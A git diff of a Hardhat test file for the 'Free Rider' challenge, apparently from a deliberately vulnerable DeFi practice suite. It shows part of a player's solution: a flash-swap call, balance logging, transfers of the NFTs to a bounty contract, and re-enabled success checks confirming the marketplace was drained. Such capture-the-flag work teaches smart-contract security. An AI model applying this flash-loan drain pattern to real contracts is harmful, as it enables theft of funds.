@@ -128,25 +128,38 @@ describe('[Challenge] Free Rider', function () {
         const borrowTx = await flashSwapContract.connect(player).flashSwap(weth.address, amountToBorrow);
         const receipt = await borrowTx.wait();
 
+        console.log("await marketplace.offersCount()", await marketplace.offersCount());
+        console.log("await ethers.provider.getBalance(marketplace.address)", await ethers.provider.getBalance(marketplace.address));
+        console.log("await ethers.provider.getBalance(player.address)", await ethers.provider.getBalance(player.address));
+        console.log("await ethers.provider.getBalance(devsContract.address)", await ethers.provider.getBalance(devsContract.address));
+
+        const data = ethers.utils.defaultAbiCoder.encode([ "address" ], [ player.address]);
+        for (let tokenId = 0; tokenId < AMOUNT_OF_NFTS; tokenId++) {
+            //there is an overloading problem from js to contract
+            //If you have two methods with the same name, you must specify the fully qualified signature to access it
+            //await nft.safeTransferFrom(player.address, devsContract.address, tokenId);
+            await nft.connect(player)['safeTransferFrom(address,address,uint256,bytes)'](player.address, devsContract.address, tokenId,data);
+        }
+
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
 
         // The devs extract all NFTs from its associated contract
-       /*  for (let tokenId = 0; tokenId < AMOUNT_OF_NFTS; tokenId++) {
+        for (let tokenId = 0; tokenId < AMOUNT_OF_NFTS; tokenId++) {
             await nft.connect(devs).transferFrom(devsContract.address, devs.address, tokenId);
             expect(await nft.ownerOf(tokenId)).to.be.eq(devs.address);
         }
 
-        // Exchange must have lost NFTs and ETH
+        //Exchange must have lost NFTs and ETH
         expect(await marketplace.offersCount()).to.be.eq(0);
         expect(
             await ethers.provider.getBalance(marketplace.address)
-        ).to.be.lt(MARKETPLACE_INITIAL_ETH_BALANCE);
+        ).to.be.lt(ethers.BigNumber.from(MARKETPLACE_INITIAL_ETH_BALANCE));
 
-        // Player must have earned all ETH
+        //Player must have earned all ETH
         expect(await ethers.provider.getBalance(player.address)).to.be.gt(BOUNTY);
-        expect(await ethers.provider.getBalance(devsContract.address)).to.be.eq(0); */
+        expect(await ethers.provider.getBalance(devsContract.address)).to.be.eq(0);
     });
 });
